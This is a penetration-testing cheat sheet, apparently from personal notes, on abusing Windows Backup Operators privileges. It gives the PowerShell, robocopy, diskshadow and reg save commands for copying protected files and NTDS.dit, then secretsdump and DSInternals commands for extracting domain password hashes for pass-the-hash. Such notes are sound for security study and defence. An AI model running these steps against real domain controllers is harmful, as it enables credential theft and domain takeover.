### Technique Name:

Backup Operators
### Summary:

The **Backup Operators** group provides its members with the `SeBackupPrivilege` and `SeRestorePrivilege`. These allow bypassing file and folder ACLs to **read or restore protected data**, even without direct permissions. This capability is extremely valuable for **exfiltrating sensitive files** such as `NTDS.dit`, `SAM`, or application config files. Backup Operators can also **log in locally to Domain Controllers**, making them a dangerous misconfiguration if assigned carelessly.
### Conditions:

- User must be a member of the **Backup Operators** group.    
- `SeBackupPrivilege` and/or `SeRestorePrivilege` must be available (can be checked via `whoami /priv`).
- Scripts like `SeBackupPrivilegeCmdLets.dll` or tools like `robocopy` with `/B` flag may be required.
- Shadow copy may be necessary for locked files like `NTDS.dit`.
### Enumeration:

```powershell
# View current user groups
whoami /groups

# View available privileges
whoami /priv

# Check specifically for SeBackupPrivilege
Get-SeBackupPrivilege
```
### Exploitation:

```powershell
# Enable privilege (if disabled)
Set-SeBackupPrivilege

# Copy protected file with custom cmdlet
Copy-FileSeBackupPrivilege 'C:\Confidential\secret.txt' .\secret.txt

# Or use robocopy (backup mode) to copy locked files
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

To copy `NTDS.dit`:

```text
# Create shadow volume using diskshadow
diskshadow
set context clientaccessible
add volume C: alias cdrive
create
expose %cdrive% E:

# Copy ntds.dit and SYSTEM hive
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\loot\ntds.dit
reg save HKLM\SYSTEM C:\loot\SYSTEM
```
### Post-Exploitation:

- Dump local or domain credentials:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

- Extract hashes using PowerShell (DSInternals):

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DBPath .\ntds.dit -BootKey $key
```
 
- Use `SAM` + `SYSTEM` hives with `secretsdump.py` for local hash extraction.

- Crack hashes or use Pass-the-Hash (PTH) for lateral movement.
### Examples:

- Read sensitive file without read permission:
   
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\Contract.pdf' .\Contract.pdf
```
 
- Dump domain user hashes:
   
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Privileged_Groups 